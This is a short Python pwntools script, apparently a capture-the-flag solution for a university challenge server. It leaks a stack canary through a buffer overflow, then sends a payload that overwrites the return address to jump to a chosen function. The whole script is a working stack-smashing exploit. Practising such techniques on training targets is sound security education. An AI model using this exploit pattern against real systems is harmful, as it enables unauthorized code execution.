from pwn import *

p = remote('cyberchallenge.disi.unitn.it', 9005)

canary_offset = 72

address = 0x00000000004011a6 

p.recvuntil('Welcome to my Teleporter! Where would you like to go?\n')  #/n importante 
p.sendline(b'A'*canary_offset)

"""
p.sendlineafter(
    b"Welcome to my Teleporter! Where would you like to go?\n",
    b"A" * canary_offset
)
"""

p.recvline()
canary = b"\x00" + p.recv(7)
print(canary)
canary = int.from_bytes(canary, "little")
print(f"Leaked canary: {hex(canary)}")

payload = b"A" * canary_offset + p64(canary) + b"B" * 8 + p64(address)

p.sendline(payload)

print(p.recvall(timeout=0.5).decode("utf-8", errors="ignore"))